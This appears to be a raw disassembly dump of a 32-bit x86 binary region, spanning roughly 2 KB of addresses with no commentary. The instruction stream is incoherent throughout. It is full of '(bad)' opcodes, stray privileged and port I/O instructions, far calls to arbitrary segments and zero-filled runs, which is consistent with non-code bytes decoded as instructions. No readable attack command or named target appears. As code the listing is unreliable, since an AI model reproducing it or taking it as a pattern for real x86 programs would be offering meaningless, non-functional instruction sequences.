  41f4ac:	int    0x1a
  41f4ae:	jns    0x41f50c
  41f4b0:	sub    BYTE PTR [ebx+0x1],dl
  41f4b3:	mov    ecx,0x6c909745
  41f4b8:	loopne 0x41f45a
  41f4ba:	mov    ch,0x25
  41f4bc:	adc    BYTE PTR [ebx+0x97ee04f],0x77
  41f4c3:	fbstp  TBYTE PTR [ebx]
  41f4c5:	icebp  
  41f4c6:	lds    edi,FWORD PTR [esi-0x14ab2510]
  41f4cc:	rcl    DWORD PTR [ecx],cl
  41f4ce:	mov    ah,0xc8
  41f4d0:	jno    0x41f46e
  41f4d2:	xchg   esp,eax
  41f4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4d4:	jp     0x41f473
  41f4d6:	mov    ds:0x7a0d9c80,al
  41f4db:	bound  eax,QWORD PTR [eax-0x48656ba6]
  41f4e1:	adc    eax,0xc3e16e84
  41f4e6:	adc    al,0x86
  41f4e8:	jbe    0x41f49c
  41f4ea:	xchg   ebp,eax
  41f4eb:	cmc    
  41f4ec:	mov    edi,0x7d28f706
  41f4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f2:	pop    ecx
  41f4f3:	in     al,0x5c
  41f4f5:	aas    
  41f4f6:	pop    esp
  41f4f7:	rcr    DWORD PTR [esi-0x1d300c49],cl
  41f4fd:	mov    esi,esi
  41f4ff:	push   edi
  41f500:	iret   
  41f501:	push   edi
  41f502:	fimul  WORD PTR [ebx]
  41f504:	shl    ch,1
  41f506:	cmp    al,0xfd
  41f508:	(bad)  
  41f509:	push   eax
  41f50a:	pop    ebp
  41f50b:	pop    es
  41f50c:	imul   edi,esp,0x249431c1
  41f512:	xchg   DWORD PTR [eax-0x6025c96d],esp
  41f518:	retf   
  41f519:	cmp    ebp,DWORD PTR [ebx-0x3d5faa41]
  41f51f:	js     0x41f521
	...
  41f529:	add    BYTE PTR [eax],al
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0xa26b075b
  41f539:	jp     0x41f517
  41f53b:	imul   esp,DWORD PTR [ebx+0xad0001],0x0
  41f542:	add    BYTE PTR [esi+edx*4+0x76],al
  41f546:	fisub  WORD PTR ds:0x50960dee
  41f54c:	xchg   edx,eax
  41f54d:	fdivr  DWORD PTR [ebp+0x2a]
  41f550:	mov    bl,BYTE PTR [edx-0x7d7600b6]
  41f556:	ins    DWORD PTR es:[edi],dx
  41f557:	ds push 0x7d10e4dd
  41f55d:	xchg   edi,eax
  41f55e:	mov    bh,0x6e
  41f560:	and    BYTE PTR [esi+0x59],0xcb
  41f564:	add    bh,bl
  41f566:	push   esp
  41f567:	sub    al,0xff
  41f569:	in     eax,dx
  41f56a:	ins    BYTE PTR es:[edi],dx
  41f56b:	aad    0x3e
  41f56d:	xchg   esp,eax
  41f56e:	fiadd  WORD PTR [ecx]
  41f570:	iret   
  41f571:	popf   
  41f572:	mov    ds:0x116c1b68,al
  41f577:	jl     0x41f510
  41f579:	in     eax,dx
  41f57a:	call   0xa4017e80
  41f57f:	xchg   ah,al
  41f581:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f583:	xchg   ebp,eax
  41f584:	mov    dh,0xbc
  41f586:	aas    
  41f587:	and    ecx,edx
  41f589:	pop    ebx
  41f58a:	mov    edi,0x5aecaf01
  41f58f:	mov    ?,WORD PTR [eax-0x4e]
  41f592:	sub    DWORD PTR ds:0x33f5d2aa,ebp
  41f598:	cmp    bh,al
  41f59a:	call   0x6d68:0x16e9b4d9
  41f5a1:	mov    ebp,cr1
  41f5a4:	xor    DWORD PTR [edx],edi
  41f5a6:	and    eax,0x93900268
  41f5ab:	inc    ecx
  41f5ac:	mov    ss,WORD PTR [ebx-0x4a5f4cdc]
  41f5b2:	cli    
  41f5b3:	mov    ebx,0x51fd97f9
  41f5b8:	mov    esp,0xc4cba892
  41f5bd:	jecxz  0x41f63d
  41f5bf:	cs mov bh,0xc4
  41f5c2:	push   es
  41f5c3:	clc    
  41f5c4:	mov    eax,0xf06ee0fd
  41f5c9:	jg     0x41f5fb
  41f5cb:	arpl   WORD PTR [ebx*1+0x41984346],ax
  41f5d2:	and    ebp,esi
  41f5d4:	int    0x7f
  41f5d6:	lods   al,BYTE PTR ds:[esi]
  41f5d7:	sub    ah,BYTE PTR [ebx+ebp*8]
  41f5da:	lods   eax,DWORD PTR ds:[esi]
  41f5db:	mov    BYTE PTR [edx],bh
  41f5dd:	scas   eax,DWORD PTR es:[edi]
  41f5de:	lea    edi,[ebx]
  41f5e0:	std    
  41f5e1:	cli    
  41f5e2:	jae    0x41f5af
  41f5e4:	add    ah,ah
  41f5e6:	push   ecx
  41f5e7:	dec    edi
  41f5e8:	sub    DWORD PTR [edx],esi
  41f5ea:	lds    ebp,FWORD PTR [ebx]
  41f5ec:	jmp    0x0:0xda4aa4
	...
  41f5fb:	aaa    
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0xa9f8:0xd39ceef4
  41f60b:	sbb    BYTE PTR [ecx+eax*1+0xad00],ah
  41f612:	add    cl,ch
  41f614:	adc    eax,0xaf4e1bbe
  41f619:	mov    dh,0x17
  41f61b:	mov    bl,0x7f
  41f61d:	leave  
  41f61e:	out    dx,eax
  41f61f:	xchg   ebx,eax
  41f620:	mov    esi,0x4032992
  41f625:	idiv   BYTE PTR [edx+0x61da3a3f]
  41f62b:	nop
  41f62c:	ret    
  41f62d:	clc    
  41f62e:	sahf   
  41f62f:	je     0x41f633
  41f631:	cdq    
  41f632:	cmp    BYTE PTR [edx-0x7f],ch
  41f635:	loope  0x41f644
  41f637:	inc    ebp
  41f638:	into   
  41f639:	dec    ebx
  41f63a:	iret   
  41f63b:	xor    eax,DWORD PTR [ebx+0x74]
  41f63e:	adc    ebx,DWORD PTR [ecx]
  41f640:	xchg   ecx,ebp
  41f642:	pop    ss
  41f643:	test   DWORD PTR [ebx+0x6f],edi
  41f646:	jg     0x41f66d
  41f648:	jo     0x41f682
  41f64a:	js     0x41f618
  41f64c:	loopne 0x41f67a
  41f64e:	mov    bh,0xfb
  41f650:	mov    ebp,0xf05d4508
  41f655:	pop    eax
  41f656:	add    eax,0x4b4a11da
  41f65b:	(bad)  
  41f65d:	xchg   ebp,eax
  41f65e:	inc    edi
  41f65f:	inc    ecx
  41f660:	mov    ebx,DWORD PTR [ecx]
  41f662:	bound  edx,QWORD PTR [edi+0x55255b5e]
  41f668:	shr    edx,1
  41f66a:	mov    ecx,0xe28b235f
  41f66f:	sub    BYTE PTR [edx],bl
  41f671:	call   0x29e4d807
  41f676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f678:	add    eax,0x58f7ec3d
  41f67d:	jg     0x41f6e6
  41f67f:	inc    edi
  41f680:	clc    
  41f681:	enter  0x80bc,0x52
  41f685:	xchg   edx,eax
  41f686:	aas    
  41f687:	nop
  41f688:	fdivrp st(5),st
  41f68a:	or     esp,DWORD PTR [esi-0x72165654]
  41f690:	inc    edi
  41f691:	or     BYTE PTR [ecx-0x22bca0b8],ch
  41f697:	cs jne 0x41f66b
  41f69a:	dec    esp
  41f69b:	mov    cl,0xef
  41f69d:	push   edi
  41f69e:	rcr    BYTE PTR [ecx-0xfbd8a80],0x8
  41f6a5:	fs aaa 
  41f6a7:	mov    eax,0xd991edc1
  41f6ac:	mov    edi,0x6667b9d4
  41f6b1:	jb     0x41f6a6
  41f6b3:	and    ch,dh
  41f6b5:	cmp    ebp,DWORD PTR [eax]
  41f6b7:	movntps XMMWORD PTR [esi+edx*1+0x2a5a17f6],xmm4
  41f6bf:	mov    bh,0x0
	...
  41f6c9:	add    BYTE PTR [eax],al
  41f6cb:	push   ss
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi+0x52c95f3a],al
  41f6d9:	push   0x1a4c588
  41f6de:	add    BYTE PTR [ebp-0x1e000000],ch
  41f6e4:	pop    edx
  41f6e5:	call   0x61e2:0xbc88baad
  41f6ec:	cmp    dl,BYTE PTR [eax]
  41f6ee:	mov    ebx,edi
  41f6f0:	repnz iret 
  41f6f2:	popf   
  41f6f3:	shr    BYTE PTR [ecx+0x2984aad7],0xdd
  41f6fa:	xor    eax,0xf8aae499
  41f6ff:	test   DWORD PTR [edx+0x50],ebp
  41f702:	and    BYTE PTR [ebp-0x2d],ah
  41f705:	leave  
  41f706:	sahf   
  41f707:	aad    0x27
  41f709:	aaa    
  41f70a:	mov    ds:0x6f76cc3a,eax
  41f70f:	xchg   ebp,eax
  41f710:	test   eax,0x99e0b824
  41f715:	in     eax,0x5c
  41f717:	(bad)  
  41f718:	(bad)  
  41f719:	call   0xc014:0x453425bc
  41f720:	and    bh,dh
  41f722:	iret   
  41f723:	xchg   DWORD PTR [ecx],esp
  41f725:	call   FWORD PTR [ebp+ecx*1+0x2cd6d6fb]
  41f72c:	fidivr DWORD PTR [edx-0x9ed9c26]
  41f732:	push   ecx
  41f733:	push   eax
  41f734:	mov    edx,0x8e1505c5
  41f739:	inc    eax
  41f73a:	dec    ebx
  41f73b:	jmp    0x1bc4:0x8a1a7ce
  41f742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f743:	or     eax,0xd1b216eb
  41f748:	(bad)  
  41f749:	setge  BYTE PTR [eax-0x26]
  41f74d:	dec    edx
  41f74e:	inc    ebx
  41f74f:	xor    DWORD PTR [ebp+0x6b1af803],eax
  41f755:	and    al,0x6e
  41f757:	repz ret 
  41f759:	out    0x8a,al
  41f75b:	add    al,0x33
  41f75d:	add    BYTE PTR [ecx],cl
  41f75f:	jo     0x41f7af
  41f761:	ds je  0x41f6ee
  41f764:	mov    edx,0xd0eca140
  41f769:	je     0x41f7c6
  41f76b:	cs dec ebp
  41f76d:	pushf  
  41f76e:	mov    al,BYTE PTR [eax+0x61]
  41f771:	sub    eax,0x541db19
  41f776:	add    al,0x7c
  41f778:	mov    al,0xaf
  41f77a:	adc    dl,bh
  41f77c:	inc    eax
  41f77d:	or     al,0x1a
  41f77f:	cmc    
  41f780:	xor    eax,0xa5c033e6
  41f785:	mov    ebp,0x545803f6
  41f78a:	push   ecx
  41f78b:	nop
  41f78c:	outs   dx,DWORD PTR ds:[esi]
  41f78d:	aaa    
  41f78e:	das    
  41f78f:	pop    edx
	...
  41f798:	add    BYTE PTR [eax],al
  41f79a:	add    BYTE PTR [esi+0x76],ch
  41f79d:	in     al,0xca
  41f79f:	cld    
  41f7a0:	fisubr DWORD PTR [esi-0xa]
  41f7a3:	sbb    BYTE PTR [edx+0x14b99787],dl
  41f7a9:	js     0x41f72c
  41f7ab:	jb     0x41f752
  41f7ad:	add    DWORD PTR [eax],eax
  41f7af:	lods   eax,DWORD PTR ds:[esi]
  41f7b0:	add    BYTE PTR [eax],al
  41f7b2:	add    BYTE PTR [ebx+0x3ea0c022],al
  41f7b8:	and    DWORD PTR [eax+0x30],ebx
  41f7bb:	xchg   ecx,eax
  41f7bc:	dec    ecx
  41f7bd:	mov    ch,0x37
  41f7bf:	inc    eax
  41f7c0:	mov    esp,0x8f8ace00
  41f7c5:	sbb    eax,0xcbbc1aa6
  41f7ca:	xchg   ebp,eax
  41f7cb:	dec    edi
  41f7cc:	ins    BYTE PTR es:[edi],dx
  41f7cd:	xchg   DWORD PTR [ecx-0x2bce708e],ebp
  41f7d3:	dec    eax
  41f7d4:	sbb    al,0xde
  41f7d6:	and    eax,0x56c26c84
  41f7db:	mov    WORD PTR [eax-0x2b5b8345],?
  41f7e1:	sahf   
  41f7e2:	nop
  41f7e3:	jge    0x41f7e2
  41f7e5:	pop    edi
  41f7e6:	dec    ecx
  41f7e7:	and    esp,DWORD PTR [ecx]
  41f7e9:	je     0x41f7b1
  41f7eb:	test   DWORD PTR [edx],ebx
  41f7ed:	jg     0x41f821
  41f7ef:	mov    ds:0xa72b2fb8,eax
  41f7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7f5:	shr    BYTE PTR [ecx-0x4c],0xe7
  41f7f9:	jno    0x41f7ab
  41f7fb:	xchg   ecx,eax
  41f7fc:	stos   BYTE PTR es:[edi],al
  41f7fd:	mov    eax,ds:0xa4d8ad96
  41f802:	lock cdq 
  41f804:	pop    ebx
  41f805:	mov    ecx,0xdb019559
  41f80a:	mov    bh,BYTE PTR [esi+0x53]
  41f80d:	xchg   ebp,eax
  41f80e:	in     eax,0xfd
  41f810:	and    eax,0xed44178
  41f815:	and    DWORD PTR ds:0xfe462573,edx
  41f81b:	mul    ah
  41f81d:	jo     0x41f7c7
  41f81f:	fstp   QWORD PTR [ebx-0x6d]
  41f822:	test   BYTE PTR [edi+0x103db0a2],ah
  41f828:	rcl    BYTE PTR [eax-0x25],1
  41f82b:	mov    eax,ds:0xe0ca3b32
  41f830:	das    
  41f831:	cmp    al,BYTE PTR [eax]
  41f833:	ds icebp 
  41f835:	push   ecx
  41f836:	pushf  
  41f837:	call   0x355c3b2a
  41f83c:	lds    eax,FWORD PTR [ebx-0x12cbc167]
  41f842:	sbb    eax,0x97607f89
  41f847:	add    eax,0xfdabbb10
  41f84c:	outs   dx,BYTE PTR ds:[esi]
  41f84d:	xchg   esp,eax
  41f84e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f84f:	cmp    eax,DWORD PTR [eax]
  41f851:	mov    al,0x22
  41f853:	fld    st(5)
  41f855:	mov    ecx,0x894e4e40
  41f85a:	(bad)  
  41f85c:	adc    cl,cl
  41f85e:	jle    0x41f8b1
	...
  41f868:	add    BYTE PTR [eax],al
  41f86a:	add    BYTE PTR [edx],bh
  41f86c:	push   edx
  41f86d:	les    ecx,FWORD PTR [edi]
  41f86f:	in     al,dx
  41f870:	lahf   
  41f871:	sti    
  41f872:	ja     0x41f86a
  41f874:	rcl    DWORD PTR [eax+0x2b7398d3],1
  41f87a:	sbb    eax,0x1a61f
  41f87f:	lods   eax,DWORD PTR ds:[esi]
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [edi],ah
  41f884:	jbe    0x41f8f5
  41f886:	(bad)  
  41f887:	push   eax
  41f888:	and    DWORD PTR [edx+0x47124dde],edx
  41f88e:	pop    eax
  41f88f:	stos   DWORD PTR es:[edi],eax
  41f890:	cld    
  41f891:	aaa    
  41f892:	gs xor eax,0xcccbdc3f
  41f898:	leave  
  41f899:	jae    0x41f8a9
  41f89b:	rep outs dx,BYTE PTR ds:[esi]
  41f89d:	ror    ecx,0xf3
  41f8a0:	push   ebx
  41f8a1:	sub    eax,0x4a16f5b7
  41f8a6:	mov    bh,0x2c
  41f8a8:	mov    edi,0x196f2218
  41f8ad:	or     al,ah
  41f8af:	lods   al,BYTE PTR ds:[esi]
  41f8b0:	sahf   
  41f8b1:	xchg   DWORD PTR [ebx],eax
  41f8b3:	mov    eax,0x85632ba0
  41f8b8:	jns    0x41f8ee
  41f8ba:	sbb    DWORD PTR [eax-0x6d],ecx
  41f8bd:	lock (bad) 
  41f8bf:	(bad)  [edi+0x67]
  41f8c2:	lea    esi,[esi+0x417b130e]
  41f8c8:	iret   
  41f8c9:	sbb    dl,BYTE PTR [ebx-0x5e1809ae]
  41f8cf:	and    dh,BYTE PTR [ecx-0x66fb738b]
  41f8d5:	adc    al,bl
  41f8d7:	gs mov ah,0xc
  41f8da:	inc    eax
  41f8db:	fdivr  QWORD PTR [ecx+0x14]
  41f8de:	sbb    bh,ah
  41f8e0:	jno    0x41f8d8
  41f8e2:	(bad)  
  41f8e3:	mov    ds:0x68068ef9,eax
  41f8e8:	rol    DWORD PTR [ecx-0xb],cl
  41f8eb:	rol    BYTE PTR [ebx+ecx*1-0xd],0x66
  41f8f0:	ficomp DWORD PTR [ebx]
  41f8f2:	lahf   
  41f8f3:	mov    bl,0xf6
  41f8f5:	or     bh,dl
  41f8f7:	loopne 0x41f8e9
  41f8f9:	(bad)  
  41f8fa:	sub    eax,esp
  41f8fc:	xchg   esp,eax
  41f8fd:	sub    eax,0x1ea5d34d
  41f902:	sbb    ecx,edx
  41f904:	call   0x3d4b3674
  41f909:	cmp    eax,0x649b6efe
  41f90e:	outs   dx,DWORD PTR ds:[esi]
  41f90f:	scas   eax,DWORD PTR es:[edi]
  41f910:	mov    ds:0x7ec815fa,eax
  41f915:	sar    dh,cl
  41f917:	pusha  
  41f918:	sbb    edx,esi
  41f91a:	inc    edi
  41f91b:	mov    eax,0x99fd8bc6
  41f920:	jge    0x41f8dc
  41f922:	push   ebp
  41f923:	cmp    esi,DWORD PTR [eax]
  41f925:	fild   DWORD PTR [esi+edx*2+0x2f]
  41f929:	ss or  al,dl
  41f92c:	jmp    0xb24399
	...
  41f939:	add    BYTE PTR [eax],al
  41f93b:	xchg   ebx,eax
  41f93c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f943:	push   eax
  41f944:	loopne 0x41f940
  41f946:	call   0xa6cc:0xae4108d6
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	lods   eax,DWORD PTR ds:[esi]
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    BYTE PTR [ebp-0x1a],dh
  41f955:	jo     0x41f9b0
  41f957:	aad    0x74
  41f959:	xchg   DWORD PTR [eax-0x6aa8ff46],ecx
  41f95f:	(bad)  
  41f961:	push   eax
  41f962:	pop    ds
  41f963:	daa    
  41f964:	mov    ebp,es
  41f966:	dec    esp
  41f967:	daa    
  41f968:	mov    ecx,DWORD PTR [ecx+ecx*1]
  41f96b:	inc    ebp
  41f96c:	sub    DWORD PTR [ecx+0x64],0x54513e1c
  41f973:	loope  0x41f938
  41f975:	or     ecx,DWORD PTR [esi]
  41f977:	(bad)  
  41f978:	mov    ds:0xc1bb8a82,al
  41f97e:	fadd   DWORD PTR [ebp-0x39]
  41f981:	stc    
  41f982:	test   DWORD PTR [edx+0x87140c1],ebx
  41f988:	std    
  41f989:	pop    eax
  41f98a:	mov    ecx,0xa4b923ba
  41f98f:	icebp  
  41f990:	mov    al,ds:0xd6571fc
  41f995:	aas    
  41f996:	aaa    
  41f997:	in     al,dx
  41f998:	mul    BYTE PTR [ecx*4-0x6d6c273a]
  41f99f:	inc    esi
  41f9a0:	(bad)
  41f9a3:	pop    eax
  41f9a4:	popf   
  41f9a5:	das    
  41f9a6:	in     eax,0x1b
  41f9a8:	loope  0x41f972
  41f9aa:	repnz mov esi,0x94e0e56
  41f9b0:	sub    eax,0xc7c7ced3
  41f9b5:	xchg   esi,eax
  41f9b6:	fnstenv [ebp-0x3a6d2473]
  41f9bc:	dec    DWORD PTR [ebp+0x71]
  41f9bf:	retf   0x2880
  41f9c2:	push   edi
  41f9c3:	leave  
  41f9c4:	sbb    bl,ah
  41f9c6:	fld    DWORD PTR [edx-0x53]
  41f9c9:	xchg   ebx,eax
  41f9ca:	ret    0x8dd6
  41f9cd:	jae    0x41fa3d
  41f9cf:	add    esi,esi
  41f9d1:	cmp    DWORD PTR [eax+0x5c],ebp
  41f9d4:	adc    DWORD PTR [ecx],ebx
  41f9d6:	bound  edx,QWORD PTR [ebx-0x4b]
  41f9d9:	xor    bh,BYTE PTR [esi-0x7ca785d9]
  41f9df:	in     eax,dx
  41f9e0:	rol    bh,cl
  41f9e2:	aam    0x3e
  41f9e4:	and    BYTE PTR [eax+0x42],ah
  41f9e7:	xchg   BYTE PTR [edi-0x16],cl
  41f9ea:	mov    esi,0x886d302b
  41f9ef:	sbb    eax,0x49f1a2f1
  41f9f4:	in     al,dx
  41f9f5:	pop    ss
  41f9f6:	cld    
  41f9f7:	mov    esp,DWORD PTR [eax-0x376e6a1]
  41f9fd:	mov    ecx,0xb2b5
	...
  41fa0a:	add    ah,bl
  41fa0c:	fincstp 
  41fa0e:	shl    bh,0xee
  41fa11:	(bad)  
  41fa12:	frstor [ecx+eax*1]
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	aad    0x50
  41fa19:	sar    ah,1
  41fa1b:	jns    0x41f9c4
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	lods   eax,DWORD PTR ds:[esi]
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    BYTE PTR [esi],ah
  41fa24:	pop    ebx
  41fa25:	std    
  41fa26:	jl     0x41fa7f
  41fa28:	mov    edi,0x31d3807a
  41fa2d:	pop    edi
  41fa2e:	cs push ss
  41fa30:	pop    edx
  41fa31:	add    ah,BYTE PTR [ecx]
  41fa33:	cdq    
  41fa34:	ins    DWORD PTR es:[edi],dx
  41fa35:	mov    dl,0x5d
  41fa37:	sahf   
  41fa38:	popa   
  41fa39:	and    BYTE PTR [edx],ah
  41fa3b:	in     eax,0x3c
  41fa3d:	pop    ss
  41fa3e:	add    eax,0x82592b5e
  41fa43:	cld    
  41fa44:	dec    ebx
  41fa45:	dec    esi
  41fa46:	in     al,0x90
  41fa48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa49:	popf   
  41fa4a:	nop
  41fa4b:	sti    
  41fa4c:	cs out 0x87,eax
  41fa4f:	and    dl,0xbd
  41fa52:	fcmovu st,st(7)
  41fa54:	push   es
  41fa55:	push   0x5e341260
  41fa5a:	xchg   ebp,eax
  41fa5b:	sub    esi,DWORD PTR [ebp+0x69]
  41fa5e:	dec    esp
  41fa5f:	stos   DWORD PTR es:[edi],eax
  41fa60:	int    0x8d
  41fa62:	call   0x50b2f082
  41fa67:	test   al,0xf2
  41fa69:	into   
  41fa6a:	retf   
  41fa6b:	and    BYTE PTR ds:0x4f4cd42f,dh
  41fa71:	or     ecx,DWORD PTR [ebx]
  41fa73:	into   
  41fa74:	sbb    ebp,ebp
  41fa76:	and    BYTE PTR [ebp+0x4040d7bf],al
  41fa7c:	jae    0x41fa9a
  41fa7e:	jmp    0x41fa48
  41fa80:	inc    ebp
  41fa81:	enter  0x8b8,0xcd
  41fa85:	aam    0xe6
  41fa87:	daa    
  41fa88:	jno    0x41fa86
  41fa8a:	aas    
  41fa8b:	leave  
  41fa8c:	std    
  41fa8d:	clc    
  41fa8e:	jnp    0x41fa79
  41fa90:	jge    0x41fabe
  41fa92:	popf   
  41fa93:	push   ecx
  41fa94:	lea    eax,[edi]
  41fa96:	test   BYTE PTR [edi],ah
  41fa98:	repz dec ebx
  41fa9a:	test   al,0x84
  41fa9c:	dec    esp
  41fa9d:	fiadd  DWORD PTR [esi]
  41fa9f:	push   edi
  41faa0:	lods   eax,DWORD PTR ds:[esi]
  41faa1:	xor    eax,0xdd490c3a
  41faa6:	ds add al,0x92
  41faa9:	xchg   BYTE PTR [ecx-0x8],dh
  41faac:	inc    ebp
  41faad:	push   esi
  41faae:	leave  
  41faaf:	push   es
  41fab0:	dec    ebp
  41fab1:	in     eax,dx
  41fab2:	(bad)  
  41fab4:	retf   
  41fab5:	or     al,0xdb
  41fab7:	fisttp DWORD PTR [ecx+0x7d4058b8]
  41fabe:	inc    edi
  41fabf:	jne    0x41fae7
  41fac1:	sub    cl,BYTE PTR [edi]
  41fac3:	sub    eax,0x949354e6
  41fac8:	cmp    eax,0x380b0e61
  41facd:	je     0x41fa76
  41facf:	daa    
	...
  41fad8:	add    BYTE PTR [eax],al
  41fada:	add    BYTE PTR [edi-0x5e],ch
  41fadd:	aam    0x2a
  41fadf:	fnstsw WORD PTR [esi-0x1]
  41fae2:	out    0x52,eax
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0x37
  41fae8:	js     0x41faaa
  41faea:	inc    ebx
  41faeb:	es test al,0x1
  41faee:	add    BYTE PTR [ebp-0x46000000],ch
  41faf4:	adc    BYTE PTR [ebx-0x2a5f9723],ah
  41fafa:	nop
  41fafb:	into   
  41fafc:	sbb    edx,DWORD PTR [ebx+0x7ddf14ef]
  41fb02:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb04:	fsub   st(2),st
  41fb06:	mov    ds:0x29613bb4,al
  41fb0b:	(bad)  
  41fb0c:	dec    esi
  41fb0d:	jbe    0x41fb6f
  41fb0f:	in     eax,0x96
  41fb11:	(bad)  
  41fb12:	sbb    al,0xa5
  41fb14:	nop
  41fb15:	retf   0xacdf
  41fb18:	xchg   ebx,eax
  41fb19:	push   esi
  41fb1a:	pushf  
  41fb1b:	je     0x41fb29
  41fb1d:	add    eax,0x44da4acb
  41fb22:	dec    ebx
  41fb23:	xor    eax,DWORD PTR [esi-0x7e]
  41fb26:	rol    BYTE PTR [ebp+eiz*2+0x3c],cl
  41fb2a:	xchg   DWORD PTR ss:[eax+eiz*1],esi
  41fb2e:	shr    dh,0x1f
  41fb31:	cdq    
  41fb32:	pop    edx
  41fb33:	push   0xffffffb1
  41fb35:	sbb    cl,BYTE PTR [eax]
  41fb37:	lods   eax,DWORD PTR ds:[esi]
  41fb38:	lahf   
  41fb39:	sub    eax,0x4ed91332
  41fb3e:	xor    eax,esi
  41fb40:	mov    esi,0x213ac1ed
  41fb45:	fild   QWORD PTR [ebx+0x62]
  41fb48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb49:	dec    eax
  41fb4a:	add    eax,0x7ea7be94
  41fb4f:	and    BYTE PTR [ebx+0x5e7733f1],bl
  41fb55:	mov    esi,0xae99136a
  41fb5a:	mov    eax,0x6c6a1fcd
  41fb5f:	cmc    
  41fb60:	inc    edx
  41fb61:	lahf   
  41fb62:	dec    edi
  41fb63:	rol    DWORD PTR [edi+0x3de57ce8],cl
  41fb69:	sub    BYTE PTR [ebp+0x63583118],dh
  41fb6f:	das    
  41fb70:	sbb    BYTE PTR [eax+0x731ad904],al
  41fb76:	sahf   
  41fb77:	add    dh,BYTE PTR [esi]
  41fb79:	scas   al,BYTE PTR es:[edi]
  41fb7a:	mov    WORD PTR [ebx+0x52],ss
  41fb7d:	jp     0x41fb9c
  41fb7f:	add    bl,BYTE PTR ds:0x9019851a
  41fb85:	xor    eax,0x36a445f
  41fb8a:	repnz or al,0xe0
  41fb8d:	xchg   edi,eax
  41fb8e:	push   cs
  41fb8f:	cs ret 0x5ad
  41fb93:	mov    bh,0x1e
  41fb95:	gs sub eax,0xa38046e5
  41fb9b:	test   al,0xdd
  41fb9d:	mov    ecx,0x802f
	...
  41fbaa:	add    cl,bh
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	loop   0x41fbd1
  41fbb9:	jle    0x41fbef
  41fbbb:	shr    DWORD PTR [eax+0xad0001],cl
  41fbc1:	add    BYTE PTR [eax],al
  41fbc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbc4:	retf   0xd371
  41fbc7:	inc    eax
  41fbc8:	xchg   edi,eax
  41fbc9:	fistp  WORD PTR [edx]
  41fbcb:	and    eax,0xe5fb254c
  41fbd0:	rcr    bh,0x8c
  41fbd3:	adc    al,0x22
  41fbd5:	ja     0x41fb79
  41fbd7:	mov    bl,0xc1
  41fbd9:	(bad)  
  41fbda:	imul   edi,DWORD PTR [eax+edi*8-0x58],0xa0f6a862
  41fbe2:	test   al,0x1f
  41fbe5:	push   ds
  41fbe6:	or     ah,0x0
  41fbe9:	cmp    DWORD PTR [ecx-0x6c6307d3],0x10ed856c
  41fbf3:	adc    BYTE PTR [edx-0x10c21b06],ch
  41fbf9:	push   0x4a9151eb
  41fbfe:	pusha  
  41fbff:	xlat   BYTE PTR ds:[ebx]
  41fc00:	loopne 0x41fbb1
  41fc02:	retf   0x130a
  41fc05:	push   ss
  41fc06:	(bad)  
  41fc07:	stos   BYTE PTR es:[edi],al
  41fc08:	test   al,ch
  41fc0a:	inc    edx
  41fc0b:	sbb    al,0x29
  41fc0d:	xchg   esp,eax
  41fc0e:	mov    ah,0x14
  41fc10:	stos   DWORD PTR es:[edi],eax
  41fc11:	inc    ecx
  41fc12:	fldcw  WORD PTR [ebp+0x71422a68]
  41fc18:	dec    eax
  41fc19:	nop
  41fc1a:	imul   ecx,DWORD PTR [ecx-0x7fc22d47],0x434cb2af
  41fc24:	jl     0x41fbc5
  41fc26:	stc    
  41fc27:	ja     0x41fbb5
  41fc29:	neg    bl
  41fc2b:	je     0x41fc47
  41fc2d:	adc    bh,BYTE PTR [edi-0xa]
  41fc30:	push   esi
  41fc31:	mov    ds,WORD PTR ss:[ecx-0x33]
  41fc35:	mov    ecx,0xa52c0500
  41fc3a:	enter  0x38c,0xbe
  41fc3e:	mov    cl,0xf6
  41fc40:	mov    bl,0x2a
  41fc42:	ror    DWORD PTR [ecx],1
  41fc44:	int    0x50
  41fc46:	push   edx
  41fc47:	in     al,0xab
  41fc49:	inc    esi
  41fc4a:	cmp    eax,0xa74cf9a
  41fc4f:	mov    ebp,0xcf1b1851
  41fc54:	popa   
  41fc55:	inc    esi
  41fc56:	daa    
  41fc57:	adc    dh,0x58
  41fc5a:	add    eax,0x43e49a38
  41fc5f:	test   al,0xb9
  41fc61:	jecxz  0x41fc59
  41fc63:	adc    al,0xd2
  41fc65:	pop    eax
  41fc66:	arpl   WORD PTR [esi],si
  41fc68:	mov    bl,0xc3
  41fc6a:	in     eax,dx
  41fc6b:	pop    edx
  41fc6c:	nop
  41fc6d:	push   ds
  41fc6e:	cwde   
  41fc6f:	add    eax,0x0
  41fc74:	add    BYTE PTR [eax],al
  41fc76:	add    BYTE PTR [eax],al
  41fc78:	add    BYTE PTR [eax],al
  41fc7a:	add    BYTE PTR [ecx+0x3e8336b9],ah
